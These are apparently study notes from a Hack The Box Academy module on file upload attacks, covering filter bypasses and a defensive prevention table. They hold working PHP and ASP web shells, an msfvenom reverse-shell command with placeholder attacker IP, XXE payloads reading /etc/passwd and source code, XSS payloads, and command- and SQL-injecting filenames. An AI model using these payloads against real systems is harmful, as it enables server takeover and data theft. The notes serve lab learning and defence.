# HTB Academy — CWES File Upload Attacks Module Notes

---

## Section 1 — Intro

File upload vulnerabilities are common and rated High/Critical. The worst case is unauthenticated arbitrary file upload → RCE. Even limited upload forms can lead to XSS, XXE, DoS, or overwriting critical files. Root cause: weak or absent file validation and verification.

---

## Section 2 — Absent Validation

**Framework identification before uploading anything:**
- Visit `/index.php`, `/index.asp`, `/index.aspx` — if the same page loads, that's the back-end language
- Wappalyzer browser extension: shows framework, web server, OS, libraries
- Burp/ZAP scanners can also identify technologies

**Testing for absent validation:**
- Upload `<?php echo "Hello HTB"; ?>` as `test.php`
- If page executes and outputs `Hello HTB` → PHP is running and there's zero back-end validation
- If it shows the source code → PHP is not executing (wrong language or filtered)

**Upload path:**
- After upload, navigate to the file (usually via a Download button or direct URL)
- Path is typically `/uploads/` or `/profile_images/`

---

## Section 3 — Upload Exploitation

### Web Shells

**Custom PHP webshell (memorize this):**
```php
<?php system($_REQUEST['cmd']); ?>
```
URL usage: `shell.php?cmd=id`

Use CTRL+U (source view) in browser to see raw command output without HTML rendering interference.

**ASP webshell:**
```asp
<% eval request('cmd') %>
```

**SecLists webshells location on Pwnbox:**
```
/opt/useful/seclists/Web-Shells/
```
phpbash provides a terminal-like semi-interactive web shell.

### Reverse Shells

**pentestmonkey PHP reverse shell:** Edit lines 49 and 50 for IP and PORT.

**msfvenom:**
```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

**Catch connection:**
```bash
nc -lvnp OUR_PORT
```

**Reverse shell vs webshell:** Reverse shells are preferred (more interactive) but may not work if a firewall blocks outgoing connections or the server disables the functions needed to initiate a connection.

---

## Section 4 — Client-Side Validation

**How to identify client-side-only validation:**
- Open DevTools Network tab before selecting a file
- Select a non-image file → watch Network tab
- If no HTTP request is sent on error → validation is entirely in the browser (JavaScript)

**Bypass Method 1 — Burp request modification:**
1. Upload a valid image → capture request in Burp
2. Modify `filename="image.jpg"` → `filename="shell.php"`
3. Replace file content with webshell
4. Content-Type can be left as-is at this stage (only matters for back-end content filters)

**Bypass Method 2 — DevTools JS removal:**
1. CTRL+SHIFT+C → click the file input element
2. Locate `onchange="checkFile(this)"` in the HTML
3. Double-click `checkFile` → delete it
4. The `accept=".jpg,.jpeg,.png"` attribute can also be removed to make PHP files selectable
5. Changes are client-side only — temporary until page refresh

**Finding the uploaded file URL:**
After upload, use CTRL+SHIFT+C and click the profile image — the `src` attribute reveals the URL:
```html
<img src="/profile_images/shell.php" class="profile-image">
```

---

## Section 5 — Blacklist Filters

A blacklist blocks specific known-bad extensions (`.php`, `.php7`, `.phps`). Weakness: it cannot block every PHP-executable extension.

**Example PHP blacklist code:**
```php
$blacklist = array('php', 'php7', 'phps');
if (in_array($extension, $blacklist)) { die(); }
```
Note: case-sensitive comparison → Windows servers allow `pHp` to bypass.

**Fuzzing with Burp Intruder:**
1. Upload request → Send to Intruder
2. Positions → Clear → highlight the extension → Add as position
3. Payloads → Load PHP extension list (PayloadsAllTheThings or SecLists)
4. **CRITICAL: Un-tick URL Encoding** — the dot before extension must not be percent-encoded
5. Start Attack → sort by Length → `File successfully uploaded` = not blacklisted

**Non-blacklisted PHP extensions that still execute:**
`.phtml` `.php5` `.php7` `.phar` `.phps`

`.phtml` is the most reliable first attempt.

---

## Section 6 — Whitelist Filters

A whitelist only allows specific extensions. More secure than a blacklist, but still bypassable if the regex is weak or if server configuration is misconfigured.

**Weak regex (bypassable with double extension):**
```php
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) { die(); }
```
No `$` anchor — checks if extension exists ANYWHERE in filename.

**Strong regex (requires different bypass):**
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { die(); }
```
`$` anchor — only passes if filename ENDS with the allowed extension.

### Double Extension (`shell.jpg.php`)
- Bypasses weak regex: filename contains `.jpg` → passes
- Ends with `.php` → server executes it as PHP
- **Fails against strong regex** (which requires ending with `.jpg`)

### Reverse Double Extension (`shell.php.jpg`)
- Bypasses strong regex: ends with `.jpg` → passes
- Exploits a misconfigured Apache config that lacks `$` anchor:
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```
If this regex has no `$`, any file containing `.php` executes as PHP, even if it ends with `.jpg`.

### Character Injection
Special characters inserted into the filename to confuse the server:
- `shell.php%00.jpg` — PHP ≤5.x null byte: file stored as `shell.php`
- `shell.aspx:.jpg` — Windows NTFS colon alternate data stream
- `shell.php%20.jpg`, `shell.php%0a.jpg`, `shell.php%0d0a.jpg`

**Permutation wordlist generator:**
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

---

## Section 7 — Type Filters (Content-Type and MIME)

Extension validation alone isn't enough. Modern apps also inspect file content.

### Content-Type Header Filter
The browser automatically sets the Content-Type header based on file extension when a file is selected. This is a client-side operation — we control it in Burp.

**PHP code that checks Content-Type:**
```php
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) { die(); }
```

**Bypass:** In Burp, change the file's Content-Type header (bottom of multipart request) to `image/jpeg` while keeping `filename="shell.php"` and PHP content.

Two Content-Type headers exist in multipart upload requests:
- Top-level (for the whole request)
- Inside the multipart section (for the file)
→ Usually need to change the file-level one (inside the multipart part)

### MIME-Type Filter (Magic Bytes)
The server inspects the first bytes of the actual file content — this is harder to bypass with just metadata changes.

**Magic bytes (file signatures):**
- GIF: `GIF87a` or `GIF89a` — both start with `GIF8`, ASCII printable, easiest to fake
- `file text.jpg` command reads magic bytes to determine type

**Bypass:** Add `GIF8` as the first line of the file content:
```
GIF8
<?php system($_REQUEST['cmd']); ?>
```

The MIME check sees `GIF8` → passes. The server then executes the rest as PHP.

Verify locally:
```bash
echo "GIF8" > shell.php && file shell.php
# → shell.php: GIF image data
```

**Combined bypass (both Content-Type AND MIME checked):**
- Change Content-Type header → `image/gif`
- Add `GIF8` as first line of file content
- Keep `filename="shell.php"`

Note: When executed, the command output will be prefixed with `GIF8` — this is expected.

---

## Section 8 — Limited File Uploads

When no arbitrary upload is possible, use allowed file types to introduce other vulnerabilities.

### XSS via SVG
SVG is XML-based. Inject JavaScript into the SVG XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
Upload → when SVG is displayed → XSS fires.

### XSS via EXIF Metadata
```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg   # verify Comment field updated
```
If the app displays image metadata → XSS fires.

### XXE via SVG — Read Files
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
Upload → view SVG → `/etc/passwd` content rendered on page.

### XXE via SVG — Read PHP Source Code
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
Decode the output: `echo "<base64>" | base64 -d`

XXE also applies to other XML-based formats: PDF, Word Documents, PowerPoint files.

### DoS Attacks
- **Decompression bomb**: nested ZIP archives → unzipping causes petabytes of data
- **Pixel flood**: JPG/PNG with compressed data claiming `0xffff x 0xffff` size → ~4 Gigapixels → memory crash
- **Overly large file**: some forms don't limit size → fills server disk
- **Directory traversal upload**: `../../../etc/passwd` as filename

---

## Section 9 — Other Upload Attacks

### Injection in Filename
If the app uses the filename in OS commands, shell metacharacters execute:
```
file$(whoami).jpg      # $() subshell
file`whoami`.jpg       # backtick subshell
file.jpg||whoami       # OR operator
```

XSS in filename (if displayed on page):
```
<script>alert(window.origin);</script>.jpg
```

SQL injection in filename (if used in SQL query):
```
file';select+sleep(5);--.jpg
```

### Upload Directory Disclosure
- Upload a file with a name that already exists → error may reveal path
- Upload two identical requests simultaneously → race condition error may reveal path
- Upload a 5000-character filename → overflow error may reveal path
- Use LFI/XXE from other vulnerabilities to read app source → find upload path
- IDOR techniques to find file naming scheme

### Windows-Specific Attacks
- Reserved characters: `|`, `<`, `>`, `*`, `?` — may cause errors revealing paths
- Reserved filenames: `CON`, `COM1`, `LPT1`, `NUL` — cannot be written on Windows
- 8.3 filename convention: `HAC~1.TXT` refers to `hackthebox.txt`; `WEB~1.CON` can overwrite `web.conf`

---

## Section 10 — Prevention (Reference for Reports)

| Defense | Implementation |
|---------|---------------|
| Both blacklist + whitelist | Blacklist catches bypass of whitelist; whitelist limits scope |
| Content-Type validation | Validate `$_FILES['uploadFile']['type']` against allowed list |
| MIME type validation | `mime_content_type($_FILES['uploadFile']['tmp_name'])` |
| Hide uploads directory | Serve via `download.php` — return 403 for direct access |
| Randomize stored filenames | Store sanitized original name in DB, serve with random disk name |
| Disable dangerous PHP functions | `disable_functions = exec,shell_exec,system,passthru` in php.ini |
| Separate upload server | RCE only compromises uploads container, not main server |
| open_basedir | Restricts PHP file access to specific directories |
| HTTP headers | `Content-Disposition: attachment`, `X-Content-Type-Options: nosniff` |
| Limit file size | Prevents DoS via oversized uploads |
| Scan uploads | Check for malware/malicious strings |
| WAF | Secondary layer of protection |

**Secure regex pattern (both blacklist and whitelist):**
```php
// Blacklist: reject .php anywhere in filename
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) { die(); }

// Whitelist: only allow filename ending with image extension
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { die(); }
```

---

## Skills Assessment Lessons (Critical — Not in Module Text)

### GIF8 magic bytes do NOT work against all MIME filters
`echo "GIF8"` produces `image/gif` as the MIME type. If the server's type check uses a regex like `/image\/[a-z]{2,3}g/`, `image/gif` **fails** because `gif` ends in `f`, not `g`.

**Fix:** Use JPEG magic bytes instead → `image/jpeg` → `jpe` + `g` → passes.
```bash
printf '\xFF\xD8\xFF\xe0' > shell.phar.jpg
echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.phar.jpg
```

MIME types that end in 'g' (pass `/image\/[a-z]{2,3}g/`):
- `image/jpeg` ✓ (`jpe` + `g`)
- `image/png` ✓ (`pn` + `g`)
- `image/svg+xml` ✓ (contains `sv` + `g`)
- `image/gif` ✗ (`gi` + `f`) — ends in f, NOT g

### SVG XXE can fire at upload time, not just at access time
If the server calls a function like `displayHTMLImage()` immediately after upload, the SVG is processed server-side during the upload request. The XXE entity resolves and **file content appears in the curl upload response** — no need to visit the file URL afterward.

Always inspect the upload response for file content before trying to access the uploaded file.

### Read the upload script source via XXE before uploading a webshell
Use `php://filter/convert.base64-encode/resource=` to read the upload script. This reveals:
- The uploads directory (`$target_dir`)
- The file naming scheme (e.g. `date('ymd') . '_' . basename(filename)`)
- The exact validation regexes

Without this, you won't know the URL of your uploaded webshell.

### Double extension with JPEG magic bytes bypasses strict combined filters
`shell.phar.jpg` with JPEG magic bytes:
- Passes blacklist (no `.php`/`.phps`/`.phtml`)
- Passes whitelist (ends in `.jpg` = `jp` + `g`)
- JPEG bytes → `image/jpeg` → passes MIME filter
- Apache executes `.phar`-containing filenames if `<FilesMatch>` has no `$` anchor

---

## Key Lessons Across the Module

- **Always identify the framework first** — webshell must match server language
- **Test with a simple echo script** before uploading a full webshell
- **Un-tick URL Encoding in Burp Intruder** when fuzzing file extensions
- **Two Content-Type headers exist** in multipart requests — modify the file's, not the request's
- **GIF8 magic bytes** are ASCII printable and the easiest to fake — they work as the first line of a PHP file
- **Weak regex has no `$` anchor** — double extension (`shell.jpg.php`) bypasses it
- **Apache misconfiguration has no `$` anchor** — reverse double extension (`shell.php.jpg`) bypasses strong whitelist but still executes
- **SVG files are XML** — XSS and XXE are both possible through SVG uploads
- **Filename itself is an attack surface** — command injection, XSS, SQLi all possible if filename is processed
- **DevTools modifications are temporary** — only need them to last for one upload
